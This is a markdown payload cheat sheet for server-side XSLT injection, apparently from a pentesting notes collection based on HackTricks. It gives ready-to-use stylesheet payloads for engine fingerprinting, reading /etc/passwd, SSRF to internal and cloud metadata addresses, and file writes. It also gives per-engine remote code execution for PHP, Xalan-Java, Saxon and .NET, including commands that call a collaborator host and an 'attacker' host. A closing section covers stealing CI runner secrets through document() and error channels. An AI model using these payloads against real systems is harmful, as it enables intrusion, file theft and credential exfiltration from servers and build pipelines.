---
title: "Payloads: XSLT Injection"
type: payloads
tags: [payloads, xslt, ssrf, rce, lfi, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-11-11
---

# Payloads: XSLT Injection

Server-side XSL stylesheet injection primitives. See [[xslt-injection]]; fingerprint the processor first.

## Fingerprint (read vendor/version, then pick engine primitives)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')"/>
 Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/>
</xsl:template></xsl:stylesheet>
```

## Local file read
```xml
<!-- Saxon / arbitrary text -->
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')"/>
<!-- PHP -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
<!-- XXE inside the stylesheet -->
<!DOCTYPE x [<!ENTITY p SYSTEM "file:///etc/passwd">]> ... &p;
```

## SSRF / port scan
```xml
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:value-of select="document('http://target:22')"/>
```

## Directory listing (PHP)
`php:function('opendir','/path')` then repeated `php:function('readdir')`.

## File write
```xml
<!-- XSLT 2.0 --><xsl:result-document href="local_file.txt">data</xsl:result-document>
<!-- libxslt/EXSLT --><exsl:document href="/var/www/html/x.txt" method="text">marker</exsl:document>
<!-- Xalan-J --><redirect:write file="x.txt">data</redirect:write>
```

## RCE per engine
```xml
<!-- PHP --><xsl:value-of select="php:function('shell_exec','id')"/>
<!-- PHP assert --><xsl:copy-of select="php:function('assert','var_dump(scandir(chr(46).chr(47)))')"/>
<!-- Xalan-Java (blind, treat as blind RCE) -->
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
<xsl:variable name="r" select="rt:getRuntime()"/>
<xsl:value-of select="rt:exec($r,'bash -c curl http://COLLAB/')"/>
<!-- Saxon reflexive --> xmlns:rt="java:java.lang.Runtime" ... rt:exec($r,'bash -c id > /tmp/x')
<!-- .NET Framework --><msxsl:script language="C#" implements-prefix="user"><![CDATA[
public string run(){System.Diagnostics.Process.Start("cmd.exe","/c ping attacker");return "ok";}]]></msxsl:script>
```

Source: HackTricks (pentesting-web)

## NEW 2025-2026

1. **Primitive ladder per engine** (unchanged but still reliable): libxslt/xsltproc -
   `document()` file read + SSRF, EXSLT `write` when enabled; Saxon - java extension
   functions = RCE if `allow-external-functions` on; MSXML - `xsl:script` RCE.
   Fingerprint the engine from error output before choosing the payload family.
2. **CI/CD transform surfaces** (2025-26 shape): PR-supplied XSLT run by
   ant/xsltproc/Saxon in build pipelines - the transform runs with repo credentials;
   `document()` exfil + `xsl:message` error channel carry secrets out of the runner.
3. **`document()` SSRF as the default claim**: internal GET + file read via
   `document('file:///etc/passwd')` or `document('http://169.254.169.254/...')` -
   OOB-gate any "internal service reached" claim with a callback.
4. **XXE pairing**: `xsl:include`/`xsl:import` + external DTD fetching where the
   parser resolves externals; test before declaring the transform sandboxed.
